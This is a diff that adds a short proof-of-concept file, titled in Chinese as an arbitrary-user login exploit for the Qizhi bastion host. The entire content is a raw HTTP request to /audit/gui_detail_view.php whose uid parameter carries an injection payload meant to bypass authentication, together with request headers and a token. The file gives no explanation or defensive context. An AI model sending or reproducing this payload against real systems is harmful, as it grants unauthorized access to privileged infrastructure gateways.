@@ -1,0 +1,9 @@
+# 齐治运维堡垒机任意用户登录
+# 齐治运维堡垒机任意用户登录
+GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm&acid=80001910&bid=hd_tag_m8mv24mb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mb
+RM-PRO-Token: 9903e1d17926cb18a510bf2e4cbd2391
+RM-PRO-Time: 1742808392119
+User-Agent: curl/7.83.1
+
